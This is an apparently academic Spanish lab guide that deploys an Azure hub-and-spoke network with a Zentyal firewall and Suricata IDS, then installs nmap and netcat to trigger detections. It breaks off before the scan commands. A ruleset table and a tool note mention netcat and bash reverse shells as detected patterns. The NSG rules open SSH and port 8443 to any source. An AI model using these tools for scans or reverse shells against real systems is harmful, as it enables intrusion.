# Guía de Laboratorio – Despliegue de Arquitectura Hub & Spoke en Azure con Zentyal Server (NVA)

> **Curso:** Seguridad en Nubes Públicas  
> **Institución:** Escuela de Comunicaciones Militares - ESCOM  
> **Nivel:** Posgrado  
> **Uso:** Interno  
> **Versión SO:** Ubuntu 24.04 LTS (Noble Numbat)

---

## Tabla de contenido

- [Objetivo del laboratorio](#objetivo-del-laboratorio)
- [Arquitectura de referencia](#arquitectura-de-referencia)
- [Requisitos previos](#requisitos-previos)
- [Componentes del laboratorio](#componentes-del-laboratorio)
- [Paso 1 – Creación del Resource Group](#paso-1--creación-del-resource-group)
- [Paso 2 – Creación de la VNet Hub](#paso-2--creación-de-la-vnet-hub)
- [Paso 3 – Creación de las VNets Spoke](#paso-3--creación-de-las-vnets-spoke)
- [Paso 4 – Despliegue de máquinas virtuales Linux](#paso-4--despliegue-de-máquinas-virtuales-linux)
- [Paso 5 – Configuración de VNet Peering](#paso-5--configuración-de-vnet-peering)
- [Paso 6 – Configuración de NSG por subred](#paso-6--configuración-de-nsg-por-subred)
- [Paso 7 – Instalación y configuración de Zentyal Server](#paso-7--instalación-y-configuración-de-zentyal-server)
- [Paso 8 – Configuración del Firewall en Zentyal](#paso-8--configuración-del-firewall-en-zentyal)
- [Paso 9 – Configuración del IDS/IPS en Zentyal (Suricata)](#paso-9--configuración-del-idsips-en-zentyal-suricata)
- [Paso 10 – Enrutamiento (UDR)](#paso-10--enrutamiento-udr-para-forzar-tráfico-a-través-de-zentyal)
- [Paso 11 – Instalación de nmap y netcat en las VMs Spoke](#paso-11--instalación-de-nmap-y-netcat-en-las-vms-spoke)
- [Paso 12 – Pruebas de detección por el IDS/IPS de Zentyal](#paso-12--pruebas-de-detección-por-el-idsips-de-zentyal)
- [Validación avanzada – Azure Network Watcher](#validación-avanzada--azure-network-watcher)
- [Resultados esperados](#resultados-esperados)

---

## Objetivo del laboratorio

El participante diseñará y desplegará paso a paso una arquitectura de red **Hub & Spoke** en Microsoft Azure, incorporando una máquina virtual Linux con **Zentyal Server Development Edition** actuando como **Firewall / Router (NVA)**, **IDS/IPS** y **gateway NAT** en la VNet Hub, con NSG por subred aplicando el principio de mínimo privilegio.

Al finalizar el laboratorio, el estudiante será capaz de:

- Crear **3 redes virtuales** (1 Hub y 2 Spoke).
- Desplegar **una VM Linux por VNet**, con **dual-NIC** para el nodo firewall.
- Instalar y configurar **Zentyal Server** como NVA con firewall, IDS/IPS y NAT.
- Configurar **VNet Peering** (Hub ↔ Spokes) con tráfico reenviado (forwarded traffic).
- Forzar tráfico **Spoke-to-Spoke** e **Internet** a través del firewall mediante **UDR**.
- Aplicar **NSG por subred** según requerimientos de mínimo privilegio.
- Instalar **nmap** y **netcat** en las VMs Spoke para generar tráfico de prueba.
- **Detectar** el tráfico generado mediante las alertas IDS/IPS de Zentyal (Suricata).
- Ejecutar **validación avanzada** con Azure Network Watcher (Next hop, Effective routes, Connection troubleshoot).

---

## Arquitectura de referencia

Se toma como base la [topología de referencia Hub-spoke de Microsoft](https://learn.microsoft.com/en-us/azure/architecture/networking/architecture/hub-spoke). El firewall Linux configurado mediante FWBuilder es reemplazado en su totalidad por **Zentyal Server**, que proporciona capacidades de routing/NAT, firewall (iptables con GUI web) y módulo IDS/IPS basado en **Suricata**.

### Diagrama (arquitectura objetivo)

```
                        (Internet)
                             ^
                             |
                      [Azure SNAT/Outbound]
                             |
                    +------------------------------+
                    |    Hub-VNet  10.0.0.0/16     |
                    |                              |
 Spoke1 Peering     |      Subnet-Back             |     Spoke2 Peering
+----------------+  |      10.0.1.0/24             |  +----------------+
| Spoke1-VNet    |  |      (WAN / EGRESS)          |  | Spoke2-VNet    |
| 10.1.0.0/16    |  |      [NIC2 - eth1]           |  | 10.2.0.0/16    |
| WorkloadSubnet |  |           |                  |  | WorkloadSubnet |
| 10.1.0.0/24    +--+    +------------+            +--+ 10.2.0.0/24    |
| VM-Spoke1      |  |    | FW-Zentyal |               | VM-Spoke2      |
| nmap, nc       |  |    |   (NVA)    |               | nmap, nc       |
+----------------+  |    +------------+            |  +----------------+
                    |           |                  |
                    |      [NIC1 - eth0]           |
                    |      Subnet-Front            |
                    |      10.0.0.0/24             |
                    +------------------------------+

Rutas UDR en Spokes:
  0.0.0.0/0        → VirtualAppliance  (IP NIC1 Zentyal – Subnet-Front)
  Spoke1: 10.2.0.0/16 → VirtualAppliance
  Spoke2: 10.1.0.0/16 → VirtualAppliance
```

> **Nota:** La VM Zentyal es un router multi-interfaz. El IP forwarding debe habilitarse tanto en Azure (NICs) como en el sistema operativo Linux.

---

## Requisitos previos

- Suscripción activa de Azure con permisos **Owner** o **Contributor**.
- **Azure CLI** o **Azure Cloud Shell** disponible.
- Conocimientos básicos de redes IP, routing, Linux y administración de servicios.
- Cliente SSH (MobaXterm u otro) para acceso a las VMs.
  - Descarga MobaXterm: <https://mobaxterm.mobatek.net/download.html>
- Navegador web moderno para la interfaz de administración de Zentyal (HTTPS).

---

## Componentes del laboratorio

| Componente | Nombre | Dirección / Detalle |
|---|---|---|
| Resource Group | `RG-Networking` | eastus |
| VNet Hub | `Hub-VNet` | 10.0.0.0/16 |
| Subnet Hub Front | `Subnet-Front` | 10.0.0.0/24 |
| Subnet Hub Back | `Subnet-Back` | 10.0.1.0/24 |
| VNet Spoke 1 | `Spoke1-VNet` | 10.1.0.0/16 |
| Subnet Spoke 1 | `WorkloadSubnet` | 10.1.0.0/24 |
| VNet Spoke 2 | `Spoke2-VNet` | 10.2.0.0/16 |
| Subnet Spoke 2 | `WorkloadSubnet` | 10.2.0.0/24 |
| VM Firewall/Zentyal | `FW-Zentyal` | 2 NICs (Front + Back) – Ubuntu 24.04 LTS |
| VM Spoke 1 | `VM-Spoke1` | 1 NIC – Ubuntu 24.04 LTS |
| VM Spoke 2 | `VM-Spoke2` | 1 NIC – Ubuntu 24.04 LTS |
| Tamaño VM Zentyal | `Standard_B2s` | **Mínimo:** 2 vCPU / 4 GB RAM (requerido por Zentyal) |
| Tamaño VMs Spoke | `Standard_B1ls` | Mínimo típico |

> ⚠️ **Importante:** Zentyal Server requiere al menos **2 vCPU y 2 GB de RAM**. No utilizar `Standard_B1ls` para el nodo firewall; usar `Standard_B2s` o superior.

---

## Paso 1 – Creación del Resource Group

Ejecutar en Azure CLI o Azure Cloud Shell:

```bash
az group create \
  --name RG-Networking \
  --location eastus
```

---

## Paso 2 – Creación de la VNet Hub

```bash
# Crear la VNet Hub
az network vnet create \
  --resource-group RG-Networking \
  --name Hub-VNet \
  --address-prefix 10.0.0.0/16

# Subnet-Front: tránsito de Spokes → NIC1 de Zentyal (eth0)
az network vnet subnet create \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Front \
  --address-prefix 10.0.0.0/24

# Subnet-Back: egress/Internet → NIC2 de Zentyal (eth1)
az network vnet subnet create \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Back \
  --address-prefix 10.0.1.0/24
```

---

## Paso 3 – Creación de las VNets Spoke

```bash
# Spoke 1
az network vnet create \
  --resource-group RG-Networking \
  --name Spoke1-VNet \
  --address-prefix 10.1.0.0/16 \
  --subnet-name WorkloadSubnet \
  --subnet-prefix 10.1.0.0/24

# Spoke 2
az network vnet create \
  --resource-group RG-Networking \
  --name Spoke2-VNet \
  --address-prefix 10.2.0.0/16 \
  --subnet-name WorkloadSubnet \
  --subnet-prefix 10.2.0.0/24
```

---

## Paso 4 – Despliegue de máquinas virtuales Linux

### 4.1 – VM Zentyal en Hub (dual NIC)

Zentyal requiere **Ubuntu 24.04 LTS** y un mínimo de `Standard_B2s`. Se crean dos NICs: una para la red interna (Subnet-Front) y otra para la salida a Internet (Subnet-Back).

```bash
# NIC Front (eth0 en Zentyal – red interna / tránsito Spokes)
az network nic create \
  --resource-group RG-Networking \
  --name fw-nic-front \
  --vnet-name Hub-VNet \
  --subnet Subnet-Front

# NIC Back (eth1 en Zentyal – salida Internet)
az network nic create \
  --resource-group RG-Networking \
  --name fw-nic-back \
  --vnet-name Hub-VNet \
  --subnet Subnet-Back

# Habilitar IP forwarding en ambas NICs (requerido para NVA en Azure)
az network nic update \
  --resource-group RG-Networking \
  --name fw-nic-front \
  --ip-forwarding true

az network nic update \
  --resource-group RG-Networking \
  --name fw-nic-back \
  --ip-forwarding true

# Crear VM Zentyal con dual NIC
# Reemplazar <CONTRASEÑA_SEGURA> por una contraseña de su elección
az vm create \
  --resource-group RG-Networking \
  --name FW-Zentyal \
  --image Ubuntu2404 \
  --size Standard_B2s \
  --nics fw-nic-back fw-nic-front \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>
```

> **Nota sobre el orden de las NICs:** En Azure, la primera NIC listada (`fw-nic-back`) se convierte en la NIC primaria del sistema operativo. Verificar la asignación de interfaces ejecutando `ip -br a` después de conectarse por SSH.

### 4.2 – VMs en los Spokes

```bash
# VM Spoke 1
az vm create \
  --resource-group RG-Networking \
  --name VM-Spoke1 \
  --image Ubuntu2404 \
  --size Standard_B1ls \
  --vnet-name Spoke1-VNet \
  --subnet WorkloadSubnet \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>

# VM Spoke 2
az vm create \
  --resource-group RG-Networking \
  --name VM-Spoke2 \
  --image Ubuntu2404 \
  --size Standard_B1ls \
  --vnet-name Spoke2-VNet \
  --subnet WorkloadSubnet \
  --admin-username azureuser \
  --authentication-type password \
  --admin-password <CONTRASEÑA_SEGURA>
```

---

## Paso 5 – Configuración de VNet Peering (Hub ↔ Spokes)

El peering debe permitir **forwarded traffic** para que el Hub actúe como nodo de tránsito NVA.

```bash
# Peering Spoke1 ↔ Hub
az network vnet peering create \
  --name Spoke1-to-Hub \
  --resource-group RG-Networking \
  --vnet-name Spoke1-VNet \
  --remote-vnet Hub-VNet \
  --allow-vnet-access \
  --allow-forwarded-traffic

az network vnet peering create \
  --name Hub-to-Spoke1 \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --remote-vnet Spoke1-VNet \
  --allow-vnet-access \
  --allow-forwarded-traffic

# Peering Spoke2 ↔ Hub
az network vnet peering create \
  --name Spoke2-to-Hub \
  --resource-group RG-Networking \
  --vnet-name Spoke2-VNet \
  --remote-vnet Hub-VNet \
  --allow-vnet-access \
  --allow-forwarded-traffic

az network vnet peering create \
  --name Hub-to-Spoke2 \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --remote-vnet Spoke2-VNet \
  --allow-vnet-access \
  --allow-forwarded-traffic
```

---

## Paso 6 – Configuración de NSG por subred

### 6.1 – NSG para Subnet-Back (Egress)

**Objetivo:** Permitir todo el tráfico saliente a Internet, permitir SSH entrante (administración) y HTTPS al puerto 8443 (panel web de Zentyal). Bloquear cualquier otro tráfico entrante.

```bash
# Crear NSG
az network nsg create \
  --resource-group RG-Networking \
  --name NSG-Subnet-Back

# Regla: permitir SSH inbound (administración del firewall)
az network nsg rule create \
  --resource-group RG-Networking \
  --nsg-name NSG-Subnet-Back \
  --name Allow-SSH-Inbound \
  --priority 100 \
  --direction Inbound \
  --access Allow \
  --protocol Tcp \
  --source-address-prefix '*' \
  --source-port-range '*' \
  --destination-address-prefix '*' \
  --destination-port-range 22

# Regla: permitir HTTPS 8443 inbound (portal web Zentyal)
az network nsg rule create \
  --resource-group RG-Networking \
  --nsg-name NSG-Subnet-Back \
  --name Allow-HTTPS-Zentyal \
  --priority 110 \
  --direction Inbound \
  --access Allow \
  --protocol Tcp \
  --source-address-prefix '*' \
  --source-port-range '*' \
  --destination-address-prefix '*' \
  --destination-port-range 8443

# Regla: permitir todo el tráfico saliente
az network nsg rule create \
  --resource-group RG-Networking \
  --nsg-name NSG-Subnet-Back \
  --name Allow-All-Outbound \
  --priority 100 \
  --direction Outbound \
  --access Allow \
  --protocol '*' \
  --source-address-prefix '*' \
  --source-port-range '*' \
  --destination-address-prefix '*' \
  --destination-port-range '*'

# Asociar NSG a Subnet-Back
az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Back \
  --network-security-group NSG-Subnet-Back
```

### 6.2 – NSG para Subnet-Front y Spokes (redes privadas)

**Objetivo:** Permitir tráfico únicamente hacia/desde rangos privados RFC 1918. Bloquear cualquier otro tráfico.

```bash
# Crear NSG
az network nsg create \
  --resource-group RG-Networking \
  --name NSG-Internal-Networks

# Regla: inbound desde rangos privados
az network nsg rule create \
  --resource-group RG-Networking \
  --nsg-name NSG-Internal-Networks \
  --name Allow-Private-Inbound \
  --priority 100 \
  --direction Inbound \
  --access Allow \
  --protocol '*' \
  --source-address-prefixes 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
  --source-port-range '*' \
  --destination-address-prefix '*' \
  --destination-port-range '*'

# Regla: outbound hacia rangos privados
az network nsg rule create \
  --resource-group RG-Networking \
  --nsg-name NSG-Internal-Networks \
  --name Allow-Private-Outbound \
  --priority 100 \
  --direction Outbound \
  --access Allow \
  --protocol '*' \
  --source-address-prefix '*' \
  --source-port-range '*' \
  --destination-address-prefixes 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 \
  --destination-port-range '*'

# Asociar NSG a Subnet-Front y subredes Spoke
az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Hub-VNet \
  --name Subnet-Front \
  --network-security-group NSG-Internal-Networks

az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Spoke1-VNet \
  --name WorkloadSubnet \
  --network-security-group NSG-Internal-Networks

az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Spoke2-VNet \
  --name WorkloadSubnet \
  --network-security-group NSG-Internal-Networks
```

**Validación de NSG (reglas efectivas en una NIC):**

```bash
az network nic list-effective-nsg \
  --resource-group RG-Networking \
  --name <NIC_NAME> \
  -o table
```

> Reemplazar `<NIC_NAME>` por el nombre de la NIC de cualquier VM creada.

---

## Paso 7 – Instalación y configuración de Zentyal Server

### 7.1 – Preparar acceso público a la VM

Ejecutar en Azure CLI o Cloud Shell:

```bash
# Crear IP pública estática para administración
az network public-ip create \
  --resource-group RG-Networking \
  --name FW-Public-IP \
  --sku Standard \
  --allocation-method Static

# Asociar la IP pública a la NIC Back (interfaz de egress)
az network nic ip-config update \
  --resource-group RG-Networking \
  --nic-name fw-nic-back \
  --name ipconfig1 \
  --public-ip-address FW-Public-IP

# Obtener la IP pública asignada
az network public-ip show \
  --resource-group RG-Networking \
  --name FW-Public-IP \
  --query "ipAddress" \
  -o tsv

# Guardar la IP privada de la NIC Front (se usará como next-hop en UDR)
FW_FRONT_IP=$(az network nic show \
  --resource-group RG-Networking \
  --name fw-nic-front \
  --query "ipConfigurations[0].privateIPAddress" -o tsv)

echo "FW Front IP (next-hop UDR): $FW_FRONT_IP"
```

### 7.2 – Conectar a la VM y preparar el sistema operativo

Conectarse a la VM `FW-Zentyal` mediante SSH (MobaXterm u otro cliente) con la IP pública obtenida y el usuario `azureuser`.

#### 7.2.1 – Forzar nomenclatura de interfaces a estilo `eth` (requerido por Zentyal)

El script de instalación de Zentyal 8.1 verifica que las interfaces de red usen la nomenclatura clásica `eth0`, `eth1`, etc. Ubuntu 24.04 usa por defecto nombres predictivos (`enp3s0`, `ens4`, etc.), por lo que **es obligatorio** configurar el sistema para usar la nomenclatura tradicional antes de ejecutar el instalador.

```bash
# Configurar GRUB para deshabilitar la nomenclatura predictiva de interfaces
sudo sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=".*"/GRUB_CMDLINE_LINUX_DEFAULT="net.ifnames=0 biosdevname=0"/' /etc/default/grub

# Aplicar la configuración de GRUB
sudo update-grub

# Reiniciar el sistema para que los cambios tomen efecto
sudo reboot
```

Después del reinicio, volver a conectarse por SSH y verificar que las interfaces ahora usan la nomenclatura `eth`:

```bash
ip -br a
# Salida esperada (ejemplo):
# lo               UNKNOWN   127.0.0.1/8
# eth0             UP        10.0.1.X/24    ← NIC Back (primaria en Azure)
# eth1             UP        10.0.0.X/24    ← NIC Front
```

> **Nota:** Si el comando anterior no muestra interfaces con prefijo `eth`, el instalador de Zentyal abortará con el mensaje `The network interface naming is not using 'eth'`. Revisar la configuración de GRUB y reiniciar nuevamente.

#### 7.2.2 – Actualizar el sistema completamente

El script de instalación de Zentyal 8.1 verifica que el sistema esté completamente actualizado (`apt dist-upgrade`) antes de continuar. Si hay paquetes pendientes, el instalador aborta.

```bash
sudo apt update
sudo apt dist-upgrade -y
```

#### 7.2.3 – Habilitar IP forwarding en el kernel

El reenvío IP debe habilitarse para que el sistema actúe como router/NVA. El benchmark CIS indica este parámetro como crítico en dispositivos que operan como router, y advierte que el hardening estándar lo deshabilita por defecto.

```bash
sudo tee /etc/sysctl.d/99-nva-forwarding.conf >/dev/null <<'EOF'
net.ipv4.ip_forward=1
# Evitar problemas con rutas asimétricas típicas en NVA
net.ipv4.conf.all.rp_filter=0
net.ipv4.conf.default.rp_filter=0
EOF

sudo sysctl --system

# Verificar que el forwarding esté activo
sysctl net.ipv4.ip_forward
# Salida esperada: net.ipv4.ip_forward = 1
```

### 7.3 – Instalar Zentyal Server 8.1 Development Edition

Zentyal 8.1 soporta oficialmente **Ubuntu 24.04 LTS (Noble Numbat)**. La instalación se realiza mediante el script oficial alojado en GitHub.

#### 7.3.1 – Descargar el script de instalación

```bash
# Descargar el script oficial de Zentyal 8.1 para Ubuntu
wget https://raw.githubusercontent.com/zentyal/zentyal/master/extra/ubuntu_installers/zentyal_installer_8.1.sh
```

#### 7.3.2 – Revisar el script antes de ejecutarlo

```bash
# Buena práctica: revisar el contenido del script antes de ejecutarlo como root
less zentyal_installer_8.1.sh
```

El script realiza las siguientes verificaciones previas a la instalación y aborta si alguna falla:

| Verificación | Descripción |
|---|---|
| Versión de Ubuntu | Requiere exactamente Ubuntu 24.04.x LTS |
| Paquetes rotos | Intenta reparar con `dpkg --configure -a`; aborta si no puede |
| Espacio en disco | Mínimo 50 MB en `/boot` y 350 MB en `/` y `/var` |
| Sistema actualizado | Requiere que no haya paquetes pendientes (`apt dist-upgrade`) |
| Conectividad a Internet | Prueba de ping a `google.es` |
| Puerto 8443 libre | Verifica que el puerto del webadmin no esté en uso |
| Nomenclatura de interfaces | Requiere interfaces con prefijo `eth` |

#### 7.3.3 – Otorgar permisos de ejecución y ejecutar el instalador

```bash
# Dar permisos de ejecución al script
chmod +x zentyal_installer_8.1.sh

# Ejecutar el instalador con privilegios de root
sudo ./zentyal_installer_8.1.sh
```

El instalador solicitará una única confirmación interactiva al inicio:

```
Do you want to install the Zentyal Graphical environment? (n|y)
```

Para este laboratorio responder **`n`** (sin entorno gráfico), ya que el acceso se realiza únicamente mediante la interfaz web y SSH. Responder `y` solo si se requiere escritorio local en la VM.

El proceso realiza automáticamente:

1. Añade el repositorio oficial de Zentyal (`packages.zentyal.org`) con su clave GPG.
2. Añade el repositorio de Firefox (requerido por el módulo `zenbuntu-desktop` si se eligió entorno gráfico).
3. Añade el repositorio de Docker (requerido por módulos que dependen de contenedores).
4. Instala los paquetes base: `zentyal` y `zenbuntu-core`.
5. Deshabilita `cloud-init` al finalizar.

> La instalación puede tomar entre **10 y 20 minutos** dependiendo de los recursos de la VM y la conectividad de red.

Al finalizar, el instalador muestra:

```
Installation complete, you can access the Zentyal Web Interface at:
  * https://<zentyal-ip-address>:8443/
```

### 7.4 – Acceder al asistente de configuración inicial

Una vez completada la instalación, Zentyal expone su interfaz de administración en HTTPS por el puerto **8443**.

```
URL de acceso: https://<IP_PUBLICA_FW>:8443
Usuario:       azureuser  (o cualquier usuario del sistema en el grupo sudo)
Contraseña:    la definida al crear la VM en Azure
```

Abrir el navegador, navegar a la URL anterior y **aceptar la advertencia de certificado autofirmado**. Esto es esperado: Zentyal genera su propio certificado TLS durante la instalación.

```bash
# Verificar que el servicio web de Zentyal esté activo (desde SSH)
sudo systemctl status zentyal.webadmin
```

> **Nota de acceso:** Zentyal permite autenticarse con cualquier usuario del sistema que pertenezca al grupo `sudo`. El usuario `azureuser` creado al provisionar la VM en Azure cumple este requisito por defecto.

Al acceder por primera vez, se presenta el **asistente de configuración inicial** que guía la selección de módulos y la configuración de red. Es importante **no reiniciar el servidor** sin haber configurado el módulo de Red a través del asistente; de lo contrario, se podría perder la configuración de red y requerir acceso manual por consola serie de Azure.

#### Selección de módulos en el asistente

Cuando el asistente solicite los módulos a instalar, seleccionar:

| Módulo | Función en el laboratorio |
|---|---|
| **Firewall** | Control de tráfico de red – filtrado de paquetes (requerido) |
| **Gateway / NAT** | Enrutamiento y NAT hacia Internet (requerido) |
| **IDS / IPS** | Detección/prevención de intrusiones con Suricata (requerido) |
| **Network** | Configuración de interfaces de red |

Zentyal gestionará automáticamente las dependencias entre módulos e instalará los paquetes necesarios al aplicar la selección.

> Si se requiere activar una **Edición Comercial** o un **Trial gratuito de 15 días**, se puede hacer después del asistente en **Sistema → Edición del Servidor → Clave de Activación**. Para este laboratorio, la **Development Edition** (gratuita, sin clave) es suficiente.

### 7.5 – Configurar las interfaces de red en Zentyal

En el panel web: **Network → Interfaces** (o durante el asistente inicial).

| Interfaz del SO | NIC Azure | Rol en Zentyal | Subred |
|---|---|---|---|
| `eth0` | `fw-nic-back` (NIC primaria en Azure) | **External** | Subnet-Back 10.0.1.0/24 |
| `eth1` | `fw-nic-front` | **Internal** | Subnet-Front 10.0.0.0/24 |

> ⚠️ **Verificar la asignación real de interfaces** ejecutando `ip -br a` en la sesión SSH antes de configurar los roles en Zentyal. En Azure, la primera NIC listada al crear la VM (`fw-nic-back`) es la NIC primaria del SO y se presenta como `eth0`. Asignar el rol **External** a la interfaz conectada a Subnet-Back y el rol **Internal** a la conectada a Subnet-Front.

---

## Paso 8 – Configuración del Firewall en Zentyal

Zentyal gestiona las reglas de firewall mediante iptables a través de su interfaz web. Cada vez que se modifiquen reglas es necesario hacer clic en **Save Changes** y luego **Apply** para compilarlas y cargarlas.

### 8.1 – Habilitar los módulos Firewall y Gateway

**Module Status** → activar **Firewall** y **Gateway** → **Save** → **Apply**.

### 8.2 – Configurar NAT / Masquerade

**Gateway → NAT Rules** → Nueva regla:

- **Interface:** `eth0` (External / Subnet-Back)
- **Masquerade:** habilitado

Esto permite que los Spokes salgan a Internet a través de Zentyal usando la IP de la NIC Back.

### 8.3 – Reglas de filtrado para tráfico desde redes internas

**Firewall → Packet Filter → Filtering rules for traffic coming from internal networks**

Las reglas se evalúan de arriba a abajo. Crear en el siguiente orden:

| # | Nombre | Dirección | Origen | Destino | Protocolo | Puerto | Acción |
|---|---|---|---|---|---|---|---|
| 1 | Allow-Established | Fwd | Any | Any | Any | Any | **Allow** |
| 2 | Allow-ICMP-Spokes | Fwd | 10.1.0.0/16, 10.2.0.0/16 | Any | ICMP | Any | **Allow** |
| 3 | Allow-DNS-Spokes | Fwd | 10.1.0.0/16, 10.2.0.0/16 | Any | UDP | 53 | **Allow** |
| 4 | Allow-HTTP-Spokes | Fwd | 10.1.0.0/16, 10.2.0.0/16 | Any | TCP | 80 | **Allow** |
| 5 | Allow-HTTPS-Spokes | Fwd | 10.1.0.0/16, 10.2.0.0/16 | Any | TCP | 443 | **Allow** |
| 6 | Allow-SSH-S1toS2 | Fwd | 10.1.0.0/16 | 10.2.0.0/16 | TCP | 22 | **Allow** |
| 7 | Allow-SSH-S2toS1 | Fwd | 10.2.0.0/16 | 10.1.0.0/16 | TCP | 22 | **Allow** |
| 8 | Deny-All | Fwd | Any | Any | Any | Any | **Deny** |

### 8.4 – Reglas de filtrado para tráfico desde redes externas

**Firewall → Packet Filter → Filtering rules for traffic coming from external networks**

| # | Nombre | Dirección | Origen | Destino | Protocolo | Puerto | Acción |
|---|---|---|---|---|---|---|---|
| 1 | Allow-SSH-Admin | Input | Any | FW-Zentyal | TCP | 22 | **Allow** |
| 2 | Allow-WebAdmin | Input | Any | FW-Zentyal | TCP | 8443 | **Allow** |
| 3 | Deny-All-External | Input | Any | Any | Any | Any | **Deny** |

### 8.5 – Verificar reglas aplicadas (desde SSH)

```bash
# Ver reglas iptables generadas por Zentyal
sudo iptables -S

# Ver reglas NAT
sudo iptables -t nat -S
```

---

## Paso 9 – Configuración del IDS/IPS en Zentyal (Suricata)

Zentyal integra **Suricata** como motor IDS/IPS. La configuración se realiza desde el panel web en **IDS/IPS**.

### 9.1 – Habilitar el módulo IDS/IPS

**Module Status** → activar **IDS/IPS** → **Save** → **Apply**.

### 9.2 – Configurar interfaces monitoreadas

**IDS/IPS → Configuration** → seleccionar interfaces a monitorear:

- `eth1` (Internal / Subnet-Front): monitorea el tráfico proveniente de los Spokes.
- `eth0` (External / Subnet-Back): monitorea el tráfico hacia Internet.

**Modo de operación:**

| Modo | Comportamiento | Recomendación |
|---|---|---|
| **IDS** | Solo detecta y alerta | Iniciar en este modo para observar |
| **IPS (Inline)** | Detecta y bloquea | Activar en la segunda fase del laboratorio |

### 9.3 – Activar rulesets de Suricata

**IDS/IPS → Rules** → habilitar los siguientes conjuntos de reglas:

| Ruleset | Descripción | Tráfico detectado |
|---|---|---|
| `emerging-scan` | Escaneos de puertos (nmap) | TCP SYN half-open, port sweeps |
| `emerging-exploit` | Exploits genéricos | TCP malformado, payloads conocidos |
| `emerging-policy` | Acceso a servicios no autorizados | Puertos y protocolos no estándar |
| `emerging-shellcode` | Shells inversas y conexiones brutas | Netcat, bash reverse shells |
| `emerging-dos` | Denegación de servicio | ICMP flood, UDP high-rate |

Pasos:

1. Ir a **IDS/IPS → Rules**.
2. Habilitar los rulesets listados anteriormente.
3. **Save** → **Apply**.

### 9.4 – Verificar el estado de Suricata

```bash
# Estado del servicio
sudo systemctl status suricata

# Ver alertas en tiempo real
sudo tail -f /var/log/suricata/fast.log

# Ver alertas en formato JSON (más detallado)
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool | head -100
```

---

## Paso 10 – Enrutamiento (UDR) para forzar tráfico a través de Zentyal

```bash
# Crear tablas de rutas por Spoke
az network route-table create \
  --name RT-Spoke1 \
  --resource-group RG-Networking

az network route-table create \
  --name RT-Spoke2 \
  --resource-group RG-Networking

# Rutas para Spoke1
# (a) Default → Zentyal (Internet)
az network route-table route create \
  --resource-group RG-Networking \
  --route-table-name RT-Spoke1 \
  --name DefaultToZentyal \
  --address-prefix 0.0.0.0/0 \
  --next-hop-type VirtualAppliance \
  --next-hop-ip-address $FW_FRONT_IP

# (b) Spoke2 → Zentyal (Spoke-to-Spoke)
az network route-table route create \
  --resource-group RG-Networking \
  --route-table-name RT-Spoke1 \
  --name ToSpoke2 \
  --address-prefix 10.2.0.0/16 \
  --next-hop-type VirtualAppliance \
  --next-hop-ip-address $FW_FRONT_IP

# Rutas para Spoke2
az network route-table route create \
  --resource-group RG-Networking \
  --route-table-name RT-Spoke2 \
  --name DefaultToZentyal \
  --address-prefix 0.0.0.0/0 \
  --next-hop-type VirtualAppliance \
  --next-hop-ip-address $FW_FRONT_IP

az network route-table route create \
  --resource-group RG-Networking \
  --route-table-name RT-Spoke2 \
  --name ToSpoke1 \
  --address-prefix 10.1.0.0/16 \
  --next-hop-type VirtualAppliance \
  --next-hop-ip-address $FW_FRONT_IP

# Asociar tablas de rutas a las subredes Spoke
az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Spoke1-VNet \
  --name WorkloadSubnet \
  --route-table RT-Spoke1

az network vnet subnet update \
  --resource-group RG-Networking \
  --vnet-name Spoke2-VNet \
  --name WorkloadSubnet \
  --route-table RT-Spoke2
```

---

## Paso 11 – Instalación de nmap y netcat en las VMs Spoke

Las VMs Spoke requieren **nmap** y **netcat** para generar el tráfico de prueba que será detectado por el IDS/IPS de Zentyal. Conectarse a cada VM Spoke por SSH y ejecutar los siguientes comandos.

> Repetir en **VM-Spoke1** y **VM-Spoke2**.

```bash
# Actualizar lista de paquetes
sudo apt-get update

# Instalar nmap (escáner de red y puertos)
sudo apt-get install -y nmap

# Instalar netcat versión OpenBSD (mayor compatibilidad)
sudo apt-get install -y netcat-openbsd

# Verificar instalaciones
nmap --version
nc -h 2>&1 | head -5
```

> **Sobre los paquetes:**
> - **nmap:** herramienta de exploración de red y auditoría de seguridad, ampliamente utilizada para descubrimiento de hosts, escaneo de puertos y detección de servicios. Sus patrones de tráfico son reconocidos por las firmas de Suricata.
> - **netcat (nc):** utilidad de red para leer/escribir datos sobre conexiones TCP/UDP. Usada en pruebas de conectividad y, en contextos adversariales, para establecer shells inversas. Las reglas `emerging-shellcode` de Suricata detectan estos patrones.

---

## Paso 12 – Pruebas de detección por el IDS/IPS de Zentyal

Las siguientes pruebas generan tráfico reconocible por las reglas de Suricata activas en Zentyal.

> ⚠️ **Monitoreo paralelo (ejecutar en FW-Zentyal antes de las pruebas):**
>
> ```bash
> sudo tail -f /var/log/suricata/fast.log
> ```
>
> O desde la interfaz web: **IDS/IPS → Dashboard** (actualización en tiempo real).

---

### Prueba 1 – Conectividad básica Spoke-to-Spoke

Verificar que el tráfico entre Spokes transita por Zentyal (TTL reducido en 2 hops).

```bash
# En VM-Spoke1 (reemplazar con la IP privada real de VM-Spoke2)
ping -c 4 <IP_PRIVADA_VM_SPOKE2>
```

**Resultado esperado:**

```
PING 10.2.0.4: 56 data bytes
64 bytes from 10.2.0.4: icmp_seq=1 ttl=62 time=X ms
```

El TTL = 62 indica que el tráfico atraviesa 2 hops (el firewall Zentyal). Si ICMP está habilitado en las reglas, Suricata puede generar alertas de baseline traffic.

---

### Prueba 2 – Escaneo de puertos con nmap (detección IDS)

Un escaneo SYN (`-sS`) realiza conexiones half-open. Este patrón es detectado por las reglas `emerging-scan` de Suricata como actividad de reconocimiento.

```bash
# En VM-Spoke1 → escanear VM-Spoke2

# Escaneo SYN de puertos comunes
